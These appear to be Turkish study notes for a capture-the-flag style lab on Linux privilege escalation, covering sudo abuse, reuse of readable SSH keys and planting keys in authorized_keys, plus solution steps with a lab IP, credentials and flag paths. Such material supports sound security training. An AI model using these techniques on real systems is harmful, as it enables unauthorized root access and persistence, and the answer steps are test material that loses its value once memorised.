---
glightbox: true
icon: material/help
---

# Privilege Escalation

Uzak bir sunucuya ilk erişim genellikle düşük ayrıcalıklı bir kullanıcı bağlamında olur. Tam erişim elde etmek için ayrıcalıklar kök kullanıcısına yükseltilmelidir. Bunun için dahili/yerel bir güvenlik açığı bulmak gerekebilir.

## PrivEsc Checklist

* [HackTricks](https://book.hacktricks.xyz/welcome/readme)
* [Payloads All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings)

## Enumeration Scripts

* [LinEnum](https://github.com/rebootuser/LinEnum)
* [linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker)
* [Seatbelt](https://github.com/GhostPack/Seatbelt)
* [JAWS](https://github.com/411Hall/JAWS)
* [PEASS](https://github.com/carlospolop/PEASS-ng)

## Kernel Exploits

Eski bir işletim sistemi çalıştıran bir sunucuyla karşılaştığımızda potansiyel kernel açıklarını aramalıyız. Sunucunun bakımının yapılmadığını varsayalım. Bu durumda sunucunun kernel açıklarına karşı savunmasız olması muhtemeldir. Kernel istismarları sistem kararsızlığına neden olabilir. Bu istismarları laboratuvar ortamında denemek ve yalnızca müşterinin açık onayı ve koordinasyonu ile çalıştırmak gerekir.

## Vulnerable Software

Sistemde yüklü yazılımlar için istismarlar aranmalıdır.

## User Privileges

Linux `sudo` komutu, kullanıcının farklı bir kullanıcı olarak komut yürütmesine olanak tanır. Aşağıdaki komut ile `sudo` ayrıcalıkları kontrol edilebilir:

```bash
sudo -l
```

Herhangi bir komut başka bir kullanıcı olarak çalıştırılabilir:

```bash
sudo -u john /bin/echo Hello World!
```

Aşağıda verilen sayfalar ayrıcalık yükseltmek amacıyla kullanılan bazı faydalı komutları/uygulamaları içerir:

* [GTFOBins](https://gtfobins.github.io/)
* [LOLBAS](https://lolbas-project.github.io)

## Exposed Credentials

Kimlik bilgilerini açığa çıkarmak için yapılandırma dosyalarına, log dosyalarına ve komut geçmişi dosyalarına bakılabilir.

## SSH Keys

Belirli bir kullanıcı için `.ssh` dizinini okuma yetkimiz olsun. Bu durumda dizinde bulunan özel SSH anahtarı oturum açmak için kullanılabilir.

Gizli anahtarın izin bilgisini değiştir:

```bash
chmod 600 ~/.ssh/id_rsa
```

Gizli anahtarı kullanarak SSH bağlantısı gerçekleştir:

```bash
ssh user@10.10.10.10 -i ~/.ssh/id_rsa
```

Belirli bir kullanıcı için `.ssh` dizinine yazma yetkimiz olsun. Bu durumda kendi üreteceğimiz bir açık anahtarı dizinde bulunan `authorized_keys` dosyasına yerleştirebiliriz. Bu teknik, shell erişimi kazandıktan sonra SSH erişimi elde etmek için kullanılır. Mevcut SSH yapılandırması diğer kullanıcılar tarafından yazılan anahtarları kabul etmeyecektir.

Öncelikle yeni bir anahtar çifti oluşturmalıyız:

```bash
ssh-keygen -f Key
```

Bu komut iki adet dosya üretecektir:

1. Key
2. Key.pub

Key.pub anahtarı uzak makinedeki `authorized_keys` dosyasına kopyalanmalıdır:

```bash
cat Key.pub >> ~/.ssh/authorized_keys
```

Bu sayede uzak sunucu özel anahtarımızı kullanarak oturum açmamıza izin verecektir.

Gizli anahtarın izin bilgisini değiştir:

```bash
chmod 600 Key
```

Gizli anahtarı kullanarak SSH bağlantısı gerçekleştir:

```bash
ssh user@10.10.10.10 -i Key
```

## Questions

```text
SSH into the server above with the provided credentials, and use the '-p xxxxxx' to specify the port shown above. Once you login, try to find a way to move to 'user2', to get the flag in '/home/user2/flag.txt'.
```

??? tip "Steps"

    SSH bağlantısı gerçekleştirmek için user1 kullanıcısını kullan (parola olarak `password1` kullan):

    ```bash
    ssh user1@94.237.53.58 -p 30018
    ```

    Ardından aşağıdaki komutu çalıştır:

    ```bash
    sudo -l
    ```

    ```text title="Output"
    Matching Defaults entries for user1 on ng-954801-gettingstartedprivesc-kwfvw-5d9799dc6d-dwnb4:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

    User user1 may run the following commands on ng-954801-gettingstartedprivesc-kwfvw-5d9799dc6d-dwnb4:
        (user2 : user2) NOPASSWD: /bin/bash
    ```

    Çıktıda görüldüğü üzere user2 kullanıcısı parola kullanmadan Bash shell çalıştırabiliyor. Bu bilgiden hareketle user2 kullanıcısına geçiş yap:

    ```bash
    sudo -u user2 /bin/bash
    ```

    Flag dosyasının içeriğini görüntüle:

    ```bash
    cat /home/user2/flag.txt
    ```

```text
Once you gain access to 'user2', try to find a way to escalate your privileges to root, to get the flag in '/root/flag.txt'.
```

??? tip "Steps"

    Aşağıdaki komutu user2 kullanıcısı olarak çalıştır:

    ```bash
    ls -al /root/.ssh
    ```

    ```text title="Output"
    total 20
    drwxr-x--- 1 root user2 4096 Feb 12  2021 .
    drwxr-x--- 1 root user2 4096 Feb 12  2021 ..
    -rw------- 1 root root   571 Feb 12  2021 authorized_keys
    -rw-r--r-- 1 root root  2602 Feb 12  2021 id_rsa
    -rw-r--r-- 1 root root   571 Feb 12  2021 id_rsa.pub
    ```

    Çıktıda görüldüğü üzere `root` kullanıcısına ait özel anahtar herkes tarafından okunabilir durumdadır. Bu dosyanın içeriğini kopyala ve ardından mevcut SSH bağlantısını sonlandır.

    Kopyaladığın özel anahtar bilgisini yerel makinede yeni bir dosyaya kaydet. Bunu yaparken dosya satır sınırlayıcısının LF formatında olduğundan ve dosya sonunda boş bir satır olduğundan emin ol!

    Gizli anahtarın izin bilgisini değiştir:

    ```bash
    chmod 600 private_key_file
    ```

    Gizli anahtarı kullanarak SSH bağlantısı gerçekleştir:

    ```bash
    ssh root@94.237.53.58 -p 30018 -i private_key_file
    ```

    Cevabı elde etmek için soruda belirtilen dosyanın içeriğini görüntüle:

    ```bash
    cat /root/flag.txt
    ```
